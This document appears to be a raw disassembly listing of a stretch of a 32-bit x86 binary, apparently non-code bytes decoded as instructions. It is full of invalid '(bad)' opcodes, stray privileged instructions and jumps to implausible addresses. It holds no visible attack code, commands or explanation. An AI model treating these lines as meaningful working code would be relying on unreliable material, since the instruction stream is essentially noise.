  414abe:	mov    bl,BYTE PTR [ebp-0x2b]
  414ac1:	in     al,0x4
  414ac3:	mov    ch,0xfe
  414ac5:	sub    bh,cl
  414ac7:	mov    DWORD PTR [edx],ebp
  414ac9:	lods   eax,DWORD PTR ds:[esi]
  414aca:	and    ebx,DWORD PTR [eax]
  414acc:	pop    esi
  414acd:	dec    esp
  414ace:	jo     0x414a9f
  414ad0:	cld    
  414ad1:	loop   0x414b3e
  414ad3:	dec    ebx
  414ad4:	jo     0x414a6c
  414ad6:	xor    eax,0xb853b2e9
  414adb:	test   BYTE PTR [ecx],0xc3
  414ade:	push   ebp
  414adf:	cmp    bh,BYTE PTR [edi+0x436ca9ad]
  414ae5:	cs retf 0xa123
  414ae9:	xor    ch,ch
  414aeb:	dec    ecx
  414aec:	mov    ebx,0x16
	...
  414b55:	add    BYTE PTR [edi+0x7e363ed9],bl
  414b5b:	neg    DWORD PTR [edi-0x265c9d07]
  414b61:	arpl   WORD PTR [eax+0x43],si
  414b64:	mov    WORD PTR [esi+0xdf67],?
  414b6a:	add    BYTE PTR [ecx],al
  414b6c:	add    BYTE PTR [eax],al
  414b6e:	and    DWORD PTR ds:0xbdf32f6,edx
  414b74:	or     DWORD PTR [eax],ebx
  414b76:	cmc    
  414b77:	inc    ebp
  414b78:	pusha  
  414b79:	popf   
  414b7a:	sbb    eax,0xfa5412e6
  414b7f:	fs aam 0x2e
  414b82:	add    DWORD PTR [ebp-0x5931ac1],esi
  414b88:	(bad)  
  414b89:	xchg   ecx,eax
  414b8a:	xchg   ebx,eax
  414b8b:	push   0xbc0814c6
  414b90:	outs   dx,DWORD PTR ds:[esi]
  414b91:	mov    al,BYTE PTR [ebp+0x1720d6db]
  414b97:	jno    0x414b56
  414b99:	push   cs
  414b9a:	nop
  414b9b:	in     al,dx
  414b9c:	xchg   DWORD PTR [esi-0x1e471e6a],edi
  414ba2:	xchg   esi,eax
  414ba3:	jo     0x414b66
  414ba5:	dec    esp
  414ba6:	scas   al,BYTE PTR es:[edi]
  414ba7:	cs std 
  414ba9:	in     eax,0x52
  414bab:	and    eax,0x96c36b55
  414bb0:	and    cl,BYTE PTR [esi+eax*1-0x62256afb]
  414bb7:	pop    es
  414bb8:	retf   
  414bb9:	dec    esi
  414bba:	inc    edx
  414bbb:	fwait
  414bbc:	(bad)  
  414bbd:	loope  0x414c26
  414bbf:	mov    cs,WORD PTR [eax]
  414bc1:	icebp  
  414bc2:	(bad)  
  414bc3:	xchg   ebp,eax
  414bc4:	pop    ss
  414bc5:	fwait
  414bc6:	push   esp
  414bc7:	and    DWORD PTR [ecx+0x15],eax
  414bca:	rcr    dl,1
  414bcc:	mov    WORD PTR [esp+ecx*2+0x2b8961f9],gs
  414bd3:	pop    edx
  414bd4:	aas    
  414bd5:	(bad)  
  414bd6:	sub    ebx,DWORD PTR [ecx]
  414bd8:	mov    ds:0x15f24e80,eax
  414bdd:	es cs and al,0x98
  414be1:	xchg   esi,eax
  414be2:	call   FWORD PTR ds:0x379eec10
  414be8:	or     BYTE PTR [eax+0x7f815822],al
  414bee:	(bad)  
  414bef:	(bad)  
  414bf0:	push   ss
  414bf1:	jmp    0xb084:0xf896fda2
  414bf8:	mov    edx,0x1fbaade3
  414bfd:	xor    esi,DWORD PTR [ebp-0x62]
  414c00:	imul   edx,ecx,0x7c
  414c03:	xchg   DWORD PTR [esi+0x7b],eax
  414c06:	(bad)  
  414c07:	call   0x7b3000be
  414c0c:	dec    esi
  414c0d:	adc    BYTE PTR [esi+0x7a51b011],bh
  414c13:	xchg   ebp,eax
  414c14:	sbb    al,0x15
  414c16:	aam    0x14
  414c18:	xchg   esp,eax
  414c19:	jecxz  0x414c33
  414c1b:	test   BYTE PTR [esi],cl
  414c1d:	sub    BYTE PTR [eax],al
  414c1f:	popa   
  414c20:	cld    
  414c21:	sub    al,0x38
  414c23:	retf   
  414c24:	stc    
  414c25:	dec    esi
  414c26:	xor    DWORD PTR [edi-0x343567b2],0x86f5fe65
  414c30:	sub    eax,DWORD PTR [edi-0x79c634ea]
  414c36:	xchg   edi,eax
  414c37:	xor    edi,edx
  414c39:	sbb    eax,0xde200cf3
  414c3e:	rol    BYTE PTR [ebx-0x10d122e1],cl
  414c44:	popa   
  414c45:	lock mov esi,0x5e8b104a
  414c4b:	inc    ebp
  414c4c:	mov    ds:0x4b62202c,al
  414c51:	push   eax
  414c52:	xchg   ebp,eax
  414c54:	psubsw mm4,QWORD PTR [ebx-0x76]
  414c58:	dec    ebp
  414c59:	int    0x0
  414c5b:	aam    0x60
  414c5d:	icebp  
  414c5e:	lods   eax,DWORD PTR ds:[esi]
  414c5f:	jle    0x414bf5
  414c61:	dec    edx
  414c62:	int3   
  414c63:	dec    ebx
  414c64:	xchg   edx,eax
  414c65:	shl    DWORD PTR [ebp+0x2],1
  414c68:	repnz pop eax
  414c6a:	mov    dh,0x20
  414c6c:	xlat   BYTE PTR ds:[ebx]
  414c6d:	daa    
	...
  414cd6:	xor    al,0x64
  414cd8:	push   ds
  414cd9:	jl     0x414d39
  414cdb:	jle    0x414d53
  414cdd:	ins    BYTE PTR es:[edi],dx
  414cde:	out    0x12,al
  414ce0:	cs adc edi,edx
  414ce3:	(bad)  
  414ce4:	hlt    
  414ce5:	mov    ds:0xe067,al
  414cea:	add    BYTE PTR [ecx],al
  414cec:	add    BYTE PTR [eax],al
  414cee:	cmp    ebx,DWORD PTR [edx]
  414cf0:	sahf   
  414cf1:	xchg   esi,eax
  414cf2:	lock data16 scas al,BYTE PTR es:[edi]
  414cf5:	pop    esp
  414cf6:	sub    BYTE PTR [edi],dl
  414cf8:	das    
  414cf9:	cli    
  414cfa:	mov    es,WORD PTR [edx-0x5f]
  414cfd:	(bad)  [edx-0x294005e7]
  414d03:	push   cs
  414d04:	jge    0x414d31
  414d06:	stos   BYTE PTR es:[edi],al
  414d07:	add    eax,DWORD PTR [esi-0xd]
  414d0a:	mov    DWORD PTR gs:[ebx],0xec4bd26b
  414d11:	ror    BYTE PTR [ebp+0x5e759761],0x3f
  414d18:	jmp    0xb6453a9b
  414d1d:	push   esp
  414d1e:	inc    esp
  414d1f:	dec    eax
  414d20:	sub    al,0x83
  414d22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d23:	or     dl,BYTE PTR [ebx-0x7a46d2b5]
  414d29:	mov    fs,WORD PTR [eax+0x18]
  414d2c:	cdq    
  414d2d:	and    al,0xfc
  414d2f:	ss mov esp,0x5958e874
  414d35:	mov    cl,0x79
  414d37:	mov    bh,0x47
  414d39:	rcl    BYTE PTR [edx],0xdf
  414d3c:	cld    
  414d3d:	repz sti 
  414d3f:	mov    eax,0xef0e89b3
  414d44:	gs jecxz 0x414cda
  414d47:	mov    eax,ds:0xa66abdc4
  414d4c:	mov    ebx,0x834fe553
  414d51:	iret   
  414d52:	xchg   ebp,eax
  414d53:	fild   DWORD PTR [ebx]
  414d55:	nop
  414d56:	mov    bl,0xfa
  414d58:	imul   edx,DWORD PTR [eax-0x1b],0xf9bd426a
  414d5f:	imul   edx,DWORD PTR [edi-0x4b],0x40
  414d63:	jne    0x414d16
  414d65:	pop    esi
  414d66:	push   edi
  414d67:	ja     0x414d2f
  414d69:	outs   dx,BYTE PTR ds:[esi]
  414d6a:	dec    esi
  414d6b:	cmp    eax,0xa760805e
  414d70:	push   0x2d
  414d72:	(bad)  
  414d73:	ins    BYTE PTR es:[edi],dx
  414d74:	imul   ebp,DWORD PTR [esi],0x22
  414d77:	mov    ss,WORD PTR [edi+edx*1+0x3aad6d31]
  414d7e:	psraw  mm0,QWORD PTR [ecx+0x5d]
  414d82:	inc    ebp
  414d83:	(bad)  
  414d84:	stos   BYTE PTR es:[edi],al
  414d85:	call   0x4e0d253e
  414d8a:	imul   ebp,ecx,0xffffffda
  414d8d:	jmp    0x414d36
  414d8f:	lock cdq 
  414d91:	mov    esi,ecx
  414d93:	repz dec esp
  414d95:	xchg   BYTE PTR [ebp+0x66276dd9],ch
  414d9b:	sahf   
  414d9c:	aam    0x47
  414d9e:	adc    dl,ch
  414da0:	dec    esi
  414da1:	ret    0x760
  414da4:	or     esp,esp
  414da6:	push   ss
  414da7:	and    eax,ebp
  414da9:	test   al,0x13
  414dab:	mov    edi,0xfe530155
  414db0:	push   es
  414db1:	(bad)  
  414db2:	or     edi,DWORD PTR [ecx+edx*1]
  414db5:	data16 (bad) 
  414db7:	jne    0x414df9
  414db9:	shl    BYTE PTR [eax+esi*2],1
  414dbc:	lock not BYTE PTR [edi]
  414dbf:	adc    eax,0x2046875f
  414dc4:	push   DWORD PTR [ebx]
  414dc6:	popf   
  414dc7:	stos   DWORD PTR es:[edi],eax
  414dc8:	sbb    ebx,DWORD PTR [ebx-0x398754c2]
  414dce:	pop    ebp
  414dcf:	mov    ds:0x4dfab924,eax
  414dd4:	inc    eax
  414dd5:	gs sti 
  414dd7:	inc    ebp
  414dd8:	int    0x99
  414dda:	(bad)  
  414ddc:	je     0x414e0b
  414dde:	sub    DWORD PTR [ebp-0x4092199],esi
  414de4:	sub    ch,0xb8
  414de7:	xlat   BYTE PTR ds:[ebx]
  414de8:	dec    esi
  414de9:	iret   
  414dea:	loope  0x414d9d
  414dec:	lods   eax,DWORD PTR ds:[esi]
  414ded:	lock add BYTE PTR [eax],al
	...
  414e54:	add    BYTE PTR [eax],al
  414e56:	mov    bh,0x99
  414e58:	adc    dl,BYTE PTR [ecx-0x404864c2]
  414e5e:	in     al,dx
  414e5f:	xor    dh,BYTE PTR [esi]
  414e61:	adc    eax,0xa59d10f3
  414e66:	addr16 loope 0x414e69
  414e69:	add    BYTE PTR [eax],al
  414e6b:	add    DWORD PTR [eax],eax
  414e6d:	add    BYTE PTR [esi],ah
  414e6f:	cwde   
  414e70:	xor    BYTE PTR [edi],al
  414e72:	push   ebp
  414e73:	pop    edi
  414e74:	pop    ds
  414e75:	jo     0x414edd
  414e77:	sbb    eax,DWORD PTR [ecx+0x5d409e28]
  414e7d:	gs push es
  414e7f:	push   cs
  414e80:	ret    
  414e81:	xor    eax,DWORD PTR [esi+0x55dd4529]
  414e87:	fcmove st,st(4)
  414e89:	adc    al,0x10
  414e8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e8c:	repz ret 
  414e8e:	or     dh,BYTE PTR [esi]
  414e90:	out    dx,al
  414e91:	mov    al,0x73
  414e93:	push   esi
  414e94:	inc    esi
  414e95:	loopne 0x414e1c
  414e97:	sbb    eax,0xc7ce1816
  414e9c:	xchg   edx,eax
  414e9d:	xchg   DWORD PTR [ecx],edx
  414e9f:	scas   al,BYTE PTR es:[edi]
  414ea0:	stos   DWORD PTR es:[edi],eax
  414ea1:	mov    edi,0xef0b5560
  414ea6:	and    ebp,DWORD PTR [ecx+0x43]
  414ea9:	scas   eax,DWORD PTR es:[edi]
  414eaa:	and    al,BYTE PTR [eax+0x4d879179]
  414eb0:	mov    bl,0x72
  414eb2:	add    al,0xd4
  414eb4:	xchg   ah,cl
  414eb6:	icebp  
  414eb7:	cs push eax
  414eb9:	add    ebx,DWORD PTR [edx]
  414ebb:	dec    ebx
  414ebc:	jno    0x414e60
  414ebe:	int    0x40
  414ec0:	or     ebx,DWORD PTR [ebx-0x43b83a61]
  414ec6:	adc    edi,ecx
  414ec8:	ret    
  414ec9:	cmp    ebx,edi
  414ecb:	jo     0x414e9a
  414ecd:	mov    ecx,0x1ad18d04
  414ed2:	or     eax,0xe63ef238
  414ed7:	pusha  
  414ed8:	mov    bh,0xbf
  414eda:	ror    DWORD PTR [esi-0x39d6fd38],0xe
  414ee1:	xchg   edx,eax
  414ee2:	inc    ebx
  414ee3:	ss nop
  414ee5:	jl     0x414f2f
  414ee7:	retf   0x4fc4
  414eea:	ins    BYTE PTR es:[edi],dx
  414eeb:	mov    cs,WORD PTR [edi-0x44678b7d]
  414ef1:	rcr    DWORD PTR [edx-0x74],cl
  414ef4:	mov    dh,0xc9
  414ef6:	les    edi,FWORD PTR [ecx-0x16]
  414ef9:	out    dx,eax
  414efa:	mov    esp,0xca73dcf8
  414eff:	xor    BYTE PTR [eax-0x5de08bc],0xd1
  414f06:	cs jno 0x414f09
  414f09:	push   esi
  414f0a:	hlt    
  414f0b:	push   esi
  414f0c:	gs (bad) 
  414f0f:	sub    al,0x9a
  414f11:	std    
  414f12:	int3   
  414f13:	mov    ecx,DWORD PTR [esi+0x6]
  414f16:	ss out 0xa8,eax
  414f19:	jmp    0x93a9dccc
  414f1e:	lahf   
  414f1f:	rcl    BYTE PTR [edi+0x67058e25],0xa6
  414f26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f27:	(bad)  
  414f28:	popa   
  414f29:	add    al,0xfc
  414f2b:	ds sbb edi,esi
  414f2e:	mov    ah,0x1d
  414f30:	cmp    bh,bh
  414f32:	xchg   BYTE PTR [ebx-0x3a0e0351],ah
  414f38:	cmp    BYTE PTR [eax+edx*8+0x4c],bh
  414f3c:	cld    
  414f3d:	inc    edx
  414f3e:	add    BYTE PTR [edx+0x6c],ah
  414f41:	sub    al,0xe9
  414f43:	cld    
  414f44:	sbb    eax,0xa7880dd0
  414f49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f4a:	call   FWORD PTR [edi]
  414f4c:	xor    eax,0xdb723a4b
  414f51:	and    dl,BYTE PTR [edi]
  414f53:	adc    eax,0xff8be06c
  414f58:	stos   DWORD PTR es:[edi],eax
  414f59:	nop
  414f5a:	mov    edx,0xfb004f8c
  414f5f:	mov    ds:0x383b1d92,eax
  414f64:	mov    edi,0x2078c9ba
  414f69:	in     al,0xcb
  414f6b:	fadd   st(3),st
  414f6d:	mov    bl,0x0
	...
  414fd3:	add    BYTE PTR [eax],al
  414fd5:	add    BYTE PTR [edi],dh
  414fd7:	data16 xor al,0x9b
  414fda:	jne    0x414fb7
  414fdc:	mov    edi,0xe45ae5ee
  414fe1:	call   0xe267:0x86ff9873
  414fe8:	add    BYTE PTR [eax],al
  414fea:	add    BYTE PTR [ecx],al
  414fec:	add    BYTE PTR [eax],al
  414fee:	sub    cl,bl
  414ff0:	idiv   edi
  414ff2:	clc    
  414ff3:	sahf   
  414ff4:	cmc    
  414ff5:	shl    DWORD PTR [eax],1
  414ff7:	arpl   WORD PTR [edx+ecx*4-0x9],ax
  414ffb:	ins    BYTE PTR es:[edi],dx
  414ffc:	stos   DWORD PTR es:[edi],eax
  414ffd:	addr16 pop es
  414fff:	imul   BYTE PTR [edx]
  415001:	imul   esi,DWORD PTR [eax],0xffffff92
  415004:	ins    DWORD PTR es:[edi],dx
  415005:	out    dx,al
  415006:	std    
  415007:	mov    eax,DWORD PTR [edi-0x2b]
  41500a:	retf   0xe863
  41500d:	and    ah,bh
  41500f:	icebp  
  415010:	inc    edi
  415011:	ja     0x41506d
  415013:	data16 (bad) 
  415015:	or     esi,DWORD PTR [eax+0x2b3d21fb]
  41501b:	pop    eax
  41501c:	sahf   
  41501d:	retf   0x8660
  415020:	popf   
  415021:	mov    ss,ecx
  415023:	push   eax
  415024:	xor    al,0xe6
  415026:	aad    0xe6
  415028:	push   0x12
  41502a:	sub    esp,DWORD PTR [eax]
  41502c:	movnti DWORD PTR [edi],ebx
  41502f:	ret    
  415030:	dec    esp
  415031:	jle    0x415081
  415033:	jbe    0x414fe8
  415035:	push   ebx
  415036:	clc    
  415037:	pop    eax
  415038:	mov    bl,0xdf
  41503a:	sub    bl,BYTE PTR [esi-0x56c93245]
  415040:	popa   
  415041:	pushf  
  415042:	jbe    0x41502a
  415044:	adc    eax,edi
  415046:	jno    0x415083
  415048:	mov    ds:0x31915b84,al
  41504d:	es push eax
  41504f:	or     dh,cl
  415051:	fadd   DWORD PTR [edx]
  415053:	sbb    eax,0x3a2328ba
  415058:	cmp    eax,0x3ea31d10
  41505d:	xchg   ebp,eax
  41505e:	stc    
  41505f:	and    eax,0xc312afb9
  415064:	push   0xfffffff7
  415066:	push   ds
  415067:	jp     0x415042
  415069:	mov    edi,0xb90d7602
  41506e:	fimul  WORD PTR [ecx]
  415070:	sbb    DWORD PTR [eax-0x2f68894d],0x63
  415077:	lea    ebx,[edx+0x4d]
  41507a:	rcl    DWORD PTR gs:[edi-0x3a297402],1
  415081:	faddp  st(2),st
  415083:	mov    esp,0xbbd8ecff
  415088:	gs add eax,0xc67c2805
  41508e:	push   ebp
  41508f:	rcl    BYTE PTR [ebp-0x435ebc46],cl
  415095:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415096:	or     BYTE PTR [edx+0x2a],0x76
  41509a:	mov    al,0xbf
  41509c:	xchg   DWORD PTR ss:[edx],eax
  41509f:	push   ds
  4150a0:	aaa    
  4150a1:	mov    ebp,0xe4e98f55
  4150a6:	or     al,0x8
  4150a8:	int    0x5e
  4150aa:	mov    esp,0x4d8c428e
  4150af:	add    al,BYTE PTR [edx+0x7c]
  4150b2:	inc    esp
  4150b3:	adc    DWORD PTR [esp+ebx*8-0x2b],edi
  4150b7:	int    0x62
  4150b9:	(bad)  
  4150ba:	int3   
  4150bb:	mov    dh,0x4a
  4150bd:	mov    ebp,0x149aba6e
  4150c2:	sub    eax,0xd91f2f3d
  4150c7:	out    0xa4,eax
  4150c9:	dec    eax
  4150ca:	inc    ebx
  4150cb:	add    DWORD PTR [ebx],eax
  4150cd:	inc    eax
  4150ce:	dec    eax
  4150cf:	dec    edx
  4150d0:	bound  esi,QWORD PTR [ecx]
  4150d2:	inc    ebp
  4150d3:	les    ebp,FWORD PTR [edi+0xc385527]
  4150d9:	mov    bh,0xb1
  4150db:	and    eax,0xe6337a06
  4150e0:	lahf   
  4150e1:	or     al,0x45
  4150e3:	js     0x415104
  4150e5:	dec    esp
  4150e6:	xchg   ebx,eax
  4150e7:	push   edx
  4150e8:	scas   al,BYTE PTR es:[edi]
  4150e9:	and    esi,ebp
  4150eb:	inc    ecx
  4150ec:	jno    0x4150b6
	...
  415156:	jnp    0x41515a
  415158:	add    ebp,ebx
  41515a:	jnp    0x415147
  41515c:	sti    
  41515d:	xchg   edx,eax
  41515e:	lahf   
  41515f:	mov    esi,0x17fdfc2d
  415164:	push   ss
  415165:	cdq    
  415166:	jcxz   0x415169
  415169:	add    BYTE PTR [eax],al
  41516b:	add    DWORD PTR [eax],eax
  41516d:	add    BYTE PTR [ebx-0xd064cce],dh
  415173:	lock (bad) 
  415175:	outs   dx,BYTE PTR ds:[esi]
  415176:	pushf  
  415177:	or     al,0x8f
  415179:	xchg   ebx,eax
  41517a:	mov    edi,0x8f98307
  41517f:	lea    edi,[ebp+0x53]
  415182:	not    DWORD PTR [ebp+esi*4-0x4a074d7e]
  415189:	dec    DWORD PTR [esi+0x4a]
  41518c:	retf   
  41518d:	jo     0x415144
  41518f:	repz or DWORD PTR [eax],ebx
  415192:	pop    es
  415193:	mov    edi,0x2ec6c704
  415198:	icebp  
  415199:	lock loope 0x415182
  41519c:	and    al,0x54
  41519f:	or     eax,0x86ab5d9c
  4151a4:	jnp    0x4151d7
  4151a6:	sbb    eax,0x471961c7
  4151ab:	out    0x69,al
  4151ad:	call   0x674f5318
  4151b2:	mov    al,ds:0x3bef75b3
  4151b7:	and    eax,0x61afc439
  4151bc:	push   edx
  4151bd:	std    
  4151be:	lods   al,BYTE PTR ds:[esi]
  4151bf:	or     ah,dl
  4151c1:	push   esp
  4151c2:	dec    ecx
  4151c3:	hlt    
  4151c4:	sbb    al,0x1d
  4151c6:	sub    esi,DWORD PTR [edi-0x309aae7f]
  4151cc:	pop    edi
  4151cd:	adc    esi,DWORD PTR [ebp+0x5d]
  4151d0:	fcom   QWORD PTR [edi]
  4151d2:	or     al,0xdd
  4151d4:	loopne 0x4151c3
  4151d6:	clc    
  4151d7:	into   
  4151d8:	cwde   
  4151d9:	push   ss
  4151da:	adc    BYTE PTR [edi+0x3f5e2a70],ah
  4151e0:	bnd jb 0x41525c
  4151e3:	push   ecx
  4151e4:	shl    BYTE PTR [ecx+0x583afcbd],1
  4151ea:	push   esi
  4151eb:	in     eax,dx
  4151ec:	push   cs
  4151ed:	push   ds
  4151ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151ef:	mov    edi,0xb2dc2e91
  4151f4:	and    DWORD PTR [eax+0x41],0x16f97dbc
  4151fb:	jno    0x41517f
  4151fd:	daa    
  4151fe:	les    edi,FWORD PTR [edx+esi*8]
  415201:	push   ebp
  415202:	push   ss
  415203:	data16 je 0x4151da
  415206:	ins    BYTE PTR es:[edi],dx
  415207:	jg     0x41523e
  415209:	test   eax,0x8c2ac6cd
  41520e:	jo     0x4151b4
  415210:	pop    edx
  415211:	xor    DWORD PTR [ecx],ebx
  415213:	mov    ecx,0xd41b0664
  415218:	xchg   ecx,eax
  415219:	mov    BYTE PTR [edi+edi*2+0x34],ch
  41521d:	xor    al,0x41
  41521f:	cmp    DWORD PTR [ecx],ebx
  415221:	cmp    dh,ah
  415223:	add    DWORD PTR [ebp+0xfb391eb],esp
  415229:	and    DWORD PTR [esi+ebx*8-0x7497527a],eax
  415230:	ins    BYTE PTR es:[edi],dx
  415231:	or     eax,0x177cd454
  415237:	popa   
  415238:	ins    BYTE PTR es:[edi],dx
  415239:	(bad)  
  41523a:	sbb    al,BYTE PTR [eax]
  41523c:	and    al,0x92
  41523e:	jae    0x4151e9
  415240:	or     eax,0x47f18982
  415245:	push   edi
  415246:	jle    0x4151d3
  415248:	mov    ebp,0x64afa4d6
  41524d:	sbb    eax,0x727e7c90
  415253:	or     ch,BYTE PTR ds:0x20d8e727
  415259:	xchg   ebp,eax
  41525a:	retf   0xe888
  41525d:	add    eax,0x2b39e80d
  415262:	add    al,0xe3
  415264:	ins    BYTE PTR es:[edi],dx
  415265:	pushf  
  415266:	mov    ebp,0x8705928a
  41526b:	push   esi
  41526c:	retf   
  41526d:	push   0x0
	...
  4152d6:	sub    al,0x97
  4152d8:	pop    ds
  4152d9:	sar    DWORD PTR [edi-0x6001127],1
  4152df:	(bad)  
  4152e0:	mov    ecx,0xa92410b
  4152e5:	pop    ecx
  4152e6:	addr16 in al,0x0
  4152e9:	add    BYTE PTR [eax],al
  4152eb:	add    DWORD PTR [eax],eax
  4152ed:	add    BYTE PTR [esi],al
  4152ef:	and    esp,DWORD PTR [ebx-0x56]
  4152f2:	cld    
  4152f3:	ds push ds
  4152f5:	(bad)  
  4152f6:	jne    0x4152e4
  4152f8:	test   DWORD PTR ds:0x54544f63,ecx
  4152fe:	lods   al,BYTE PTR ds:[esi]
  4152ff:	pusha  
  415300:	lea    ebp,[edx-0x13caa30a]
  415306:	or     al,dh
  415308:	jmp    0xd883fd4e
  41530d:	rcl    BYTE PTR [ebx-0x60ff6222],0xbf
  415314:	and    ebx,DWORD PTR [ecx+eax*2]
  415317:	jmp    0x7204ee3d
  41531c:	test   ah,bl
  41531e:	(bad)  
  41531f:	imul   ebp,DWORD PTR [esi],0xfffffffe
  415322:	inc    ebx
  415323:	dec    ecx
  415324:	push   ebx
  415325:	mov    al,0x56
  415327:	dec    edi
  415328:	ins    DWORD PTR es:[edi],dx
  415329:	cs dec esp
  41532b:	mov    ecx,0x22f3928d
  415330:	int3   
  415331:	dec    ebp
  415332:	jle    0x41533d
  415334:	cmp    dh,BYTE PTR [edi]
  415336:	retf   
  415337:	fadd   DWORD PTR [ebp+edx*4-0xb]
  41533b:	lahf   
  41533c:	stc    
  41533d:	mov    ecx,0x53b74ba1
  415342:	lahf   
  415343:	daa    
  415344:	inc    esi
  415345:	xor    eax,0xd13721ed
  41534a:	adc    BYTE PTR [ecx-0x5b],0x3e
  41534e:	out    0x2b,eax
  415350:	cmp    DWORD PTR [eax],ecx
  415352:	popf   
  415353:	mov    BYTE PTR [eax],cl
  415355:	push   ss
  415356:	add    eax,0xb7cd47a9
  41535b:	js     0x4152de
  41535d:	inc    edi
  41535e:	ins    DWORD PTR es:[edi],dx
  41535f:	sub    DWORD PTR ss:[eax+0x2],edx
  415363:	or     ah,BYTE PTR [ebx+0x64ebb80]
  415369:	and    edi,DWORD PTR cs:[ebx+0x75]
  41536d:	dec    ecx
  41536e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41536f:	pop    esp
  415370:	pop    edx
  415371:	and    DWORD PTR [eax-0x3de330e0],ecx
  415377:	lods   eax,DWORD PTR ds:[esi]
  415378:	cli    
  415379:	sahf   
  41537a:	(bad)  
  41537c:	jbe    0x4153ce
  41537e:	sbb    BYTE PTR [ebx+0x7f],ch
  415381:	mov    edx,0x76ae09b6
  415386:	test   eax,0x88a9407a
  41538b:	and    al,0xf5
  41538d:	call   0x7d6c:0x8048339
  415394:	and    eax,0xc6426e24
  415399:	xor    al,0x27
  41539b:	or     eax,0xb275000f
  4153a0:	(bad)  
  4153a1:	data16 out 0xd5,al
  4153a4:	rcr    DWORD PTR [esi+0x6a81cd8f],cl
  4153aa:	xchg   esp,eax
  4153ab:	(bad)  
  4153ac:	and    BYTE PTR [edi+edi*4-0xd61e5d0],cl
  4153b3:	scas   eax,DWORD PTR es:[edi]
  4153b4:	ret    0xb772
  4153b7:	add    ah,BYTE PTR ds:0x67016a7e
  4153bd:	fistp  QWORD PTR [eax]
  4153bf:	mov    eax,ds:0x1acf4285
  4153c4:	sbb    BYTE PTR [ebp-0x3198467e],ah
  4153ca:	aam    0xd7
  4153cc:	add    BYTE PTR [ebp-0x725f7adb],ah
  4153d2:	ss push ecx
  4153d4:	xor    cl,BYTE PTR [edi-0x1faac1c4]
  4153da:	dec    edi
  4153db:	xor    esp,DWORD PTR [ebx-0x3c96760d]
  4153e1:	mov    al,0x13
  4153e3:	or     cl,BYTE PTR ds:0x7374514a
  4153e9:	cdq    
  4153ea:	dec    edi
  4153eb:	adc    eax,0xbfec
	...
  415454:	add    BYTE PTR [eax],al
  415456:	ins    DWORD PTR es:[edi],dx
  415457:	lock repz jmp FWORD PTR cs:[edi]
  41545c:	std    
  41545d:	repz mov edi,0xc6d3e5b0
  415463:	inc    ecx
  415464:	out    0x3e,eax
  415466:	addr16 in eax,0x0
  415469:	add    BYTE PTR [eax],al
  41546b:	add    DWORD PTR [eax],eax
  41546d:	add    BYTE PTR [edx],ch
  41546f:	jbe    0x4154be
  415471:	test   eax,0x94ff4034
  415476:	clc    
  415477:	addr16 dec ecx
  415479:	ins    BYTE PTR es:[edi],dx
  41547a:	add    bh,BYTE PTR [esi-0x2f8b62a4]
  415480:	adc    dh,BYTE PTR [esi-0x3]
  415483:	push   esp
  415484:	std    
  415485:	add    eax,0xa8fe672f
  41548a:	cmp    dl,BYTE PTR [eax+0x2b7c8b7f]
  415490:	and    BYTE PTR [eax-0x3423866e],ch
  415496:	pop    ecx
  415497:	ins    DWORD PTR es:[edi],dx
  415498:	repnz mov BYTE PTR [edx],bh
  41549b:	mov    eax,eax
  41549d:	mov    DWORD PTR [esi-0x77],esi
  4154a0:	pop    ecx
  4154a1:	and    eax,0xba7390ed
  4154a6:	mov    edx,eax
  4154a8:	jg     0x4154f1
  4154aa:	xchg   esi,eax
  4154ab:	lock sub BYTE PTR [ecx+0x34],0x79
  4154b0:	imul   ebp,DWORD PTR [esi+eiz*4-0x188dc384],0x8230637a
  4154bb:	mov    ebx,0xe4bac721
  4154c0:	xchg   ebx,eax
  4154c1:	push   edi
  4154c2:	or     bl,al
  4154c4:	fcmove st,st(2)
  4154c6:	push   ebp
  4154c7:	push   cs
  4154c8:	pop    es
  4154c9:	add    ah,dh
  4154cb:	mov    bh,0xa9
  4154cd:	arpl   cx,di
  4154cf:	test   al,0xf7
  4154d1:	lds    esp,FWORD PTR [eax+0x753b86a9]
  4154d7:	push   edx
  4154d8:	lds    esp,FWORD PTR [esi+edi*4-0x414d77d4]
  4154df:	xchg   edi,eax
  4154e0:	ins    BYTE PTR es:[edi],dx
  4154e1:	add    bh,BYTE PTR [ebx]
  4154e3:	sti    
  4154e4:	jle    0x41555d
  4154e6:	xchg   edi,eax
  4154e7:	fwait
  4154e8:	mov    ?,WORD PTR [edx]
  4154ea:	(bad)  
  4154eb:	push   ecx
  4154ec:	in     eax,dx
  4154ed:	push   es
  4154ee:	mov    ebx,0x786a325d
  4154f3:	sub    DWORD PTR [edx+0x8c81fcd],ebp
  4154f9:	cmp    esi,esi
  4154fb:	cmc    
  4154fc:	retf   0x536
  4154ff:	pusha  
  415500:	push   edi
  415501:	pop    eax
  415502:	dec    eax
  415503:	ja     0x415583
  415505:	mov    BYTE PTR [esi],bh
  415507:	(bad)  
  415508:	pop    ebx
  415509:	pop    ebx
  41550a:	mov    esp,0x2e2ed43a
  41550f:	sbb    dl,bh
  415511:	sub    edi,DWORD PTR ds:0xa94bb7a8
  415517:	aam    0x91
  415519:	push   eax
  41551a:	sbb    BYTE PTR [edi+0x3a],dl
  41551d:	(bad)  
  41551e:	shl    BYTE PTR [edx],cl
  415520:	aad    0x79
  415522:	adc    DWORD PTR [eax+0x1cb2cba0],0xffffffe9
  415529:	retf   
  41552a:	cmp    edx,ecx
  41552c:	mov    ds:0x74c1d839,al
  415531:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415532:	lea    esi,[eax-0x6621d29]
  415538:	add    DWORD PTR [edi-0x4f],esi
  41553b:	cmp    eax,0x8cb5082a
  415540:	shl    al,0x86
  415543:	je     0x415553
  415545:	or     BYTE PTR [edi],dh
  415547:	minps  xmm6,XMMWORD PTR [ebx-0x1ae55a3d]
  41554e:	scas   eax,DWORD PTR es:[edi]
  41554f:	imul   ebp,ecx,0x28
  415552:	add    al,0xc5
  415554:	sbb    eax,0x7d125eee
  415559:	pop    ebx
  41555a:	cmp    ah,BYTE PTR [esi-0x14e0a45e]
  415560:	or     ebp,DWORD PTR [ebx]
  415562:	fidivr WORD PTR [ecx]
